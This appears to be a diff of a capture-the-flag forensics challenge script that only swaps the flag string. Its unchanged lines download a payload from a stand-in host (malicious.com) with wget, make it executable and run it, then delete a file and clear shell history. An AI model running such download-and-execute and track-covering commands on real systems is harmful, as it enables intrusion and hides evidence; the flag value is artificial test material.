@@ -3,6 +3,6 @@ cd /tmp
 wget http://malicious.com/payload.sh
 chmod +x payload.sh
 ./payload.sh
-echo "CTF{forensics_orkydpykg0z8}" > /tmp/secret.txt
+echo "CTF{forensics_7xp9lqr5oo0c}" > /tmp/secret.txt
 rm /tmp/secret.txt
 history -c
